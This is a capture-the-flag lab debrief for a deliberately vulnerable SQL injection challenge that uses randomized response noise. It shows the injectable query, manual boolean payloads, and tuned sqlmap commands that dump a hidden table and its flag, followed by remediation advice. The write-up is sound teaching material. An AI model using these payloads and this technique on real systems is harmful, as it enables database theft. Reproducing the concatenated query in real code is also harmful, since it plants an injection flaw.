# The Echo Chamber, Debrief

**Node:** `p2_5` &middot; **Flag:** `SEIYAKU{define_your_own_oracle}` &middot; **Route:** `GET /p2/echo` &middot; **Sink:** `challenges/phase2.py`, `mariadb` (`echo_words` table, `echo_vault` table)

## Root cause

The word-check builds its query with raw f-string concatenation, no
escaping, and returns only whether a row matched:

```python
# challenges/phase2.py
q = f"SELECT 1 FROM echo_words WHERE word = '{whisper}'"  # VULN: string concat
cur.execute(q)
resonates = cur.fetchone() is not None
```

A match renders the phrase "the chamber resonates"; a non-match (or a broken
query, folded into the same outcome) renders "only silence". There is no
error text and no result set on the page, so this is a pure boolean-blind
oracle, one honest bit per request, exactly like the Silent Room (p1_4).

What makes this floor its own lesson is the deliberately noisy output. Every
response also carries a fresh random "resonance reading" (a variable number
of random hex lines):

```python
def _resonance_noise():
    return [secrets.token_hex(24) for _ in range(secrets.randbelow(24) + 16)]
```

So no two responses are byte-similar, even for the identical input.

## The technique: defining the oracle for sqlmap

sqlmap's automatic boolean detection works by *comparing responses*: it
sends a condition it forces true and one it forces false and looks for a
stable difference. That heuristic assumes the page is otherwise stable. Here
it isn't, the random reading dominates every response, so sqlmap cannot tell
"the difference caused by my injection" apart from "the difference that
happens on every request anyway."

The fix is to stop letting sqlmap guess and tell it what a true response
looks like:

- **`--string="the chamber resonates"`** pins the oracle to the one stable
  marker that appears only on a true match. (`--not-string` pins a marker
  that appears only on false; `--code=200` keys on an HTTP status when that
  is the differentiator instead of body text.)
- **`--technique=B`** forces the fast boolean-based method instead of
  letting sqlmap fall back to the slow time-based one.
- **`--time-sec=N`** tunes the delay threshold for that time-based fallback,
  useful on a noisy network where default timing could misfire.

Two details make the boolean path actually work here, and both are general
lessons, not quirks of this floor:

1. **The marker must be unique to a true response.** The phrases "the
   chamber resonates" / "only silence" appear *only* in the answer, never in
   the page's static text, so `--string` matches true responses exclusively.
   If the marker also appeared in the briefing, it would match every page
   and the oracle would be useless.
2. **The base request must already be true.** An `AND`-based payload
   (`... AND '1'='1'` vs `... AND '1'='2'`) can only flip a request that is
   already true. Point sqlmap at `whisper=resonance` (a word the chamber
   actually holds, so the base page rings), not `whisper=x` (which never
   matches, so both AND-true and AND-false stay "silence" and there is
   nothing to compare).

## The walk (verified live against this exact seed)

**1. Read the oracle by hand.** The marker only shows on a true match:

```
/p2/echo?whisper=resonance     -> the chamber resonates   (a real word: true)
/p2/echo?whisper=' OR '1'='1   -> the chamber resonates   (forced true)
/p2/echo?whisper=' OR '1'='2   -> only silence            (forced false)
```

Request the same URL twice and the resonance reading below the answer is
different each time, that noise is the whole obstacle.

**2. Watch the default run struggle.** Plain sqlmap, no tuning, against a
true baseline:

```
sqlmap -u "http://localhost:8000/p2/echo?whisper=resonance" -p whisper --batch
```

It immediately flags the instability and cannot use boolean:

```
[WARNING] target URL content is not stable (i.e. content differs). sqlmap
will base the page comparison on a sequence matcher...
[INFO] GET parameter 'whisper' appears to be 'MySQL >= 5.0.12 AND time-based
blind (query SLEEP)' injectable
```

It misses boolean entirely and falls back to time-based (slow). It also
reports the parameter "appears UNION injectable", but that is a structural
guess: this route never reflects the query's result set on the page, so
UNION has nothing to exfiltrate through. The only channels that actually
extract data are the blind ones, and time-based alone is painfully slow.

**3. Define the oracle and force boolean.** Give sqlmap the marker and the
method, against the same true baseline:

```
sqlmap -u "http://localhost:8000/p2/echo?whisper=resonance" -p whisper \
    --batch --ignore-stdin --technique=B --string="the chamber resonates" \
    --dump -T echo_vault
```

Now it locks straight onto boolean and dumps the hidden table fast:

```
[INFO] GET parameter 'whisper' appears to be 'AND boolean-based blind -
WHERE or HAVING clause' injectable
[INFO] retrieved: seiyaku_p2_echo
[INFO] retrieved: SEIYAKU{define_your_own_oracle}
Database: seiyaku_p2_echo
Table: echo_vault
[1 entry]
+----+---------------+---------------------------------+
| id | label         | secret                          |
+----+---------------+---------------------------------+
| 1  | the true word | SEIYAKU{define_your_own_oracle} |
+----+---------------+---------------------------------+
```

`solvers/p2_5.sh` runs exactly this tuned command end to end and asserts the
flag. (`--ignore-stdin` is the same non-interactive gotcha covered in A
Sealed Floor's debrief.)

## HxH analogy

Trick Tower's rooms are built to disorient: a place that answers every
question in a slightly different voice, so you can never be sure whether the
change you heard meant anything. An applicant who tries to read the room by
comparing whole answers gets lost in the variation. The one who wins is the
one who decides in advance what a "yes" actually sounds like, one fixed
tell, and listens only for that, letting all the theatrical noise wash past.

sqlmap out of the box is the applicant comparing whole answers, and the
chamber's random resonance is exactly the theatrical noise built to defeat
that. `--string` is deciding in advance what "yes" sounds like. Once the
tool stops trying to guess and listens for the one tell you named, the noise
stops mattering at all.

## Remediation

- **Parameterized queries, always**, the same root fix as every floor:

  ```python
  cur.execute("SELECT 1 FROM echo_words WHERE word = %s", (whisper,))
  ```

  Noisy output is not a defense; it slows an automated scanner down but does
  nothing against a hand-written boolean payload, and `--string` erases the
  slowdown anyway. The only real fix is to stop the input being re-parsed as
  SQL.
- **Don't rely on "unstable output" as a security control.** Randomizing a
  response can frustrate automated tooling, but it is defense by obscurity:
  the underlying one-bit leak is unchanged, and any attacker who identifies
  the stable signal (by hand or with `--string`) is unaffected.
- **Least privilege on the DB account**, same as the rest of the lab: the
  chamber's user can read only what the check needs, so `echo_vault`, which
  the legitimate query never touches, should not be reachable at all.

## Isolation

This floor lives in its own database (`seiyaku_p2_echo`) and connects as its
own restricted user (`svc_p2_echo`), granted access to nothing else.
Verified live: from that user, `information_schema` shows only this floor's
own two tables (`echo_words`, `echo_vault`), and a cross-database read of
another challenge's table is denied (`ERROR 1142`). Solving this floor
cannot surface any other challenge's data or flag. (Every MariaDB-backed
challenge in the lab is isolated the same way.)
